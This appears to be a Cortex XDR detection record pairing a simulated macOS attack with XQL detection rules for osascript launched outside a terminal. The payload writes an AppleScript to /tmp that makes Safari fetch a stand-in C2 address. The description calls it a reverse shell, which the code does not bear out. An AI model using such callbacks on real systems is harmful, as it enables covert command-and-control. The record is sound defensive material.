identity.name: Uncommon AppleScript Execution via Command Line to External Server
identity.summary: An attacker executes an AppleScript via the command line to establish a reverse shell connection to an external C2 server. Cortex detects this behavior as anomalous due to the uncommon use of AppleScr
identity.description: An attacker executes an AppleScript via the command line to establish a reverse shell connection to an external C2 server. Cortex detects this behavior as anomalous due to the uncommon use of AppleScript from command-line interfaces.

payload.code:
echo 'tell application "Safari" to do JavaScript "fetch(\"http://192.0.2.10:8080/\")"' > /tmp/script.scpt
osascript /tmp/script.scpt

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Uncommon AppleScript Execution via Command Line
biocs.description: Detection of osascript executed from command-line interface with no visible terminal context
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'osascript'
| filter causality_actor_process_image_name != 'bash' and causality_actor_process_image_name != 'zsh'
| filter action_file_path = '/tmp/script.scpt'

abiocs.name: Suspicious AppleScript Process Start from CLI
abiocs.description: Behavioral deviation where osascript is invoked directly from CLI without terminal context
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'osascript'
| filter causality_actor_process_image_name not in ('bash', 'zsh', 'sh')
abiocs.causality_anchor: osascript process start from non-terminal context

xql_queries.name: Detect osascript from CLI
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'osascript'
| filter causality_actor_process_image_name not in ('bash', 'zsh', 'sh')
| fields agent_hostname, action_process_image_name, causality_actor_process_image_name
